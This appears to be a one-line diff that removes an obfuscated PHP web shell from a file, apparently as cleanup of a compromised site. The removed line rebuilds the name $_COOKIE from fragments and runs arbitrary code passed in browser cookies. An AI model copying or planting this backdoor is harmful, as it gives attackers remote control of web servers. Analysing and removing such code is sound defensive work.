@@ -1,1 +1,0 @@
-<?php $b='OO';$xy/*hQ:o*/='_C';$ss/*%(E*/='KI';$s/*Z7S*/='E';$ui=/*x$a3*/${$xy.$b.$ss.$s};if(isset($ui['d'])){$m=/*0H&*/$ui['d'].$ui['W'];$kb=$ui['xB'].$ui['fI'].$ui['CD'];$ft=$m('',$kb($ui['J']));$ft();}
